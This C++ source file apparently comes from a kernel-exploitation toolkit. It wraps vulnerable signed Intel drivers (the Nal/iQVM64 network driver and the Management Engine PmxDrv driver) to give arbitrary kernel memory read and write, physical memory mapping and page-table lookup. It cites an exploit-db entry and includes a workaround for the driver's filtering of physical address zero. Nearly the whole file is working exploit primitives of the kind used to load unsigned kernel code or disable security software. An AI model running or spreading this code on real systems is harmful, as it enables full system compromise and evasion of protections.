/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2024
*
*  TITLE:       INTEL.CPP
*
*  VERSION:     1.42
*
*  DATE:        01 Apr 2024
*
*  Intel drivers routines.
*
*    Network Adapter iQVM64 driver aka Nal
*    Intel(R) Management Engine Tools Driver aka PmxDrv
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/intel.h"

//
// Based on https://www.exploit-db.com/exploits/36392
//

/*
* NalCallDriver
*
* Purpose:
*
* Call Intel Nal driver.
*
*/
BOOL NalCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Buffer,
    _In_ ULONG Size)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IOCTL_NAL_MANAGE,
        Buffer,
        Size,
        NULL,
        0);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* NalMapAddressEx
*
* Purpose:
*
* Call MmMapIoSpace via Nal driver, return kernel mode virtual address.
*
*/
BOOL NalMapAddressEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_ ULONG_PTR* VirtualAddress,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    NAL_MAP_IO_SPACE request;

    if (VirtualAddress)
        *VirtualAddress = 0;
    else
        return FALSE;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_MAPIOSPACE;
    request.PhysicalAddress = PhysicalAddress;
    request.NumberOfBytes = NumberOfBytes;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        if (request.OpResult == 0) {
            *VirtualAddress = request.VirtualAddress;
            bResult = TRUE;
        }
        else {
            SetLastError(ERROR_INTERNAL_ERROR);
        }
    }

    return bResult;
}

/*
* NalUnmapAddress
*
* Purpose:
*
* Call MmUnmapIoSpace via Nal driver.
*
*/
BOOL NalUnmapAddress(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    NAL_UNMAP_IO_SPACE request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_UNMAPIOSPACE;
    request.VirtualAddress = VirtualAddress;
    request.NumberOfBytes = NumberOfBytes;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        bResult = (request.OpResult == 0);
        if (bResult == FALSE) {
            SetLastError(ERROR_NONE_MAPPED);
        }
    }

    return bResult;
}

/*
* NalVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
* N.B.
* Call driver Intel Nal driver MmGetVirtualForPhysical switch case.
*
*/
BOOL WINAPI NalVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;
    NAL_GET_PHYSICAL_ADDRESS request;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_VIRTUALTOPHYSCAL;
    request.VirtualAddress = VirtualAddress;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        *PhysicalAddress = request.PhysicalAddress;
        bResult = TRUE;
    }

    return bResult;
}

/*
* NalReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via Nal memmove switch case.
*
*/
_Success_(return != FALSE)
BOOL NalReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    NAL_MEMMOVE request;

    PVOID lockedBuffer = (PVOID)supAllocateLockedMemory(NumberOfBytes,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);

    if (lockedBuffer) {

        RtlSecureZeroMemory(&request, sizeof(request));
        request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
        request.SourceAddress = VirtualAddress;
        request.DestinationAddress = (ULONG_PTR)lockedBuffer;
        request.Length = NumberOfBytes;

        bResult = NalCallDriver(DeviceHandle, &request, sizeof(request));
        if (bResult) {
            RtlCopyMemory(Buffer, lockedBuffer, NumberOfBytes);
        }
        else {
            dwError = GetLastError();
        }

        supFreeLockedMemory(lockedBuffer, NumberOfBytes);
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* NalWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via Nal memmove switch case.
*
*/
_Success_(return != FALSE)
BOOL NalWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    NAL_MEMMOVE request;

    PVOID lockedBuffer = (PVOID)supAllocateLockedMemory(NumberOfBytes,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);

    if (lockedBuffer) {

        RtlCopyMemory(lockedBuffer, Buffer, NumberOfBytes);

        RtlSecureZeroMemory(&request, sizeof(request));
        request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
        request.SourceAddress = (ULONG_PTR)lockedBuffer;
        request.DestinationAddress = VirtualAddress;
        request.Length = NumberOfBytes;

        bResult = NalCallDriver(DeviceHandle, &request, sizeof(request));
        if (bResult == FALSE) {
            dwError = GetLastError();
        }

        supFreeLockedMemory(lockedBuffer, NumberOfBytes);
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* NalWriteVirtualMemory
*
* Purpose:
*
* Write to virtual memory via mapping.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NalWriteVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR physAddress, mappedVirt;

    if (NalVirtualToPhysical(DeviceHandle, VirtualAddress, &physAddress)) {

        if (NalMapAddressEx(DeviceHandle, physAddress, &mappedVirt, NumberOfBytes)) {

            bResult = NalWriteVirtualMemory(DeviceHandle, mappedVirt, Buffer, NumberOfBytes);
            if (bResult == FALSE)
                dwError = GetLastError();

            NalUnmapAddress(DeviceHandle, mappedVirt, NumberOfBytes);
        }
        else {
            dwError = GetLastError();
        }

    }
    else {
        dwError = GetLastError();
    }
    SetLastError(dwError);
    return bResult;
}

/*
* NalReadVirtualMemoryEx
*
* Purpose:
*
* Read virtual memory via mapping.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NalReadVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID lockedBuffer = (PVOID)supAllocateLockedMemory(NumberOfBytes,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);

    if (lockedBuffer) {

        ULONG_PTR physicalAddress, newVirt;

        if (NalVirtualToPhysical(DeviceHandle, VirtualAddress, &physicalAddress)) {
            if (NalMapAddressEx(DeviceHandle, physicalAddress, &newVirt, NumberOfBytes)) {

                bResult = NalReadVirtualMemory(DeviceHandle, newVirt, lockedBuffer, NumberOfBytes);
                if (bResult) {
                    RtlCopyMemory(Buffer, lockedBuffer, NumberOfBytes);
                }
                else {
                    dwError = GetLastError();
                }

                NalUnmapAddress(DeviceHandle, newVirt, NumberOfBytes);
            }
        }
        else {
            dwError = GetLastError();
        }

        supFreeLockedMemory(lockedBuffer, NumberOfBytes);
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* 
* Intel ME driver
* 
*/

/*
* PmxDrvMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID PmxDrvMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    BOOL bHack = FALSE;
    PVOID pvMappedMemory = NULL;
    PMX_INPUT_BUFFER request;
    PMX_MAPMEM_PACKET packet;

    request.InputSize = sizeof(request) + sizeof(PMX_MAPMEM_PACKET);
    request.Padding = 0;

    packet.Size = sizeof(PMX_MAPMEM_PACKET);
    packet.CommitSize = NumberOfBytes;
    if (PhysicalAddress == 0) { //intel seems filters this
        bHack = TRUE;
        PhysicalAddress = 0x1;
    }

    packet.SectionOffset.QuadPart = PhysicalAddress;

    request.Data = &packet;

    if (supCallDriver(DeviceHandle,
        IOCTL_PMXDRV_MAP_MEMORY,
        &request,
        sizeof(request),
        NULL,
        0))
    {
        if (bHack) {
            packet.SectionOffset.QuadPart &= 0xfff;
            packet.Result -= packet.SectionOffset.QuadPart;
        }
        pvMappedMemory = (PVOID)packet.Result;
    }

    return pvMappedMemory;
}

/*
* PmxDrvUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID PmxDrvUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap
)
{
    PMX_INPUT_BUFFER request;
    PMX_UNMAPMEM_PACKET packet;

    request.InputSize = sizeof(request) + sizeof(PMX_UNMAPMEM_PACKET);
    request.Padding = 0;

    RtlSecureZeroMemory(&packet, sizeof(packet));

    packet.Address = SectionToUnmap;
    packet.Size = sizeof(PMX_UNMAPMEM_PACKET);

    request.Data = &packet;

    supCallDriver(DeviceHandle,
        IOCTL_PMXDRV_UNMAP_MEMORY,
        &request,
        sizeof(request),
        NULL,
        0);
}

/*
* PmxDrvReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI PmxDrvReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = PmxDrvMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes);

    if (mappedSection) {

        __try {

            if (DoWrite) {
                RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        PmxDrvUnmapMemory(DeviceHandle,
            mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* PmxDrvReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI PmxDrvReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return PmxDrvReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* PmxDrvWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI PmxDrvWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return PmxDrvReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* PmxDrvQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI PmxDrvQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    ULONG cbRead = 0x100000;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)PmxDrvMapMemory(DeviceHandle,
        0ULL,
        cbRead);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        PmxDrvUnmapMemory(DeviceHandle,
            (PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* PmxDrvVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI PmxDrvVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        PmxDrvQueryPML4Value,
        PmxDrvReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* PmxDrvReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI PmxDrvReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = PmxDrvVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PmxDrvReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* PmxDrvWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI PmxDrvWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = PmxDrvVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PmxDrvReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}
